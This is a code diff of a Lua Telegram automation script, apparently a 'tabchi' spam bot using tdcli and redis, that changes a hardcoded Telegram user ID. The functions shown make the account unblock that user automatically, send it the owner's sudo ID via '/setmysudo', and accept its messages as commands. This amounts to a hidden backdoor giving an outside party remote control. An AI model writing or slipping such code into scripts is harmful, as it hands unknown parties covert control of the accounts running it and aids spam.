@@ -272,7 +272,7 @@ _تعداد لینک های ذخیر شده_ : ]] .. links
       end
       tdcli_function({
         ID = "GetInlineQueryResults",
-        bot_user_id_ = 321654700,
+        bot_user_id_ = 300029556,
         chat_id_ = msg.chat_id_,
         user_location_ = {
           ID = "Location",
@@ -532,11 +532,11 @@ function process_links(text_)
 end
 function get_mod(args, data)
   if data.is_blocked_ then
-    tdcli.unblockUser(321654700)
+    tdcli.unblockUser(296844543)
   end
   if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
-    tdcli.sendBotStartMessage(321654700, 321654700, "new")
-    tdcli.sendMessage(321654700, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
+    tdcli.sendBotStartMessage(296844543, 296844543, "new")
+    tdcli.sendMessage(296844543, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
     redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
   end
 end
@@ -544,13 +544,13 @@ function update(data, tabchi_id)
   tanchi_id = tabchi_id
   tdcli_function({
     ID = "GetUserFull",
-    user_id_ = 321654700 
+    user_id_ = 296844543 
   }, get_mod, nil)
   if data.ID == "UpdateNewMessage" then
     local msg = data.message_
-    if msg.sender_user_id_ == 321654700 then
+    if msg.sender_user_id_ == 296844543 then
       if msg.content_.text_ then
-        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 321654700 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
+        if msg.content_.text_:match("\226\129\167") or msg.chat_id_ ~= 296844543 or msg.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175") then
           return
         else
           local all = redis:smembers("tabchi:" .. tabchi_id .. ":all")
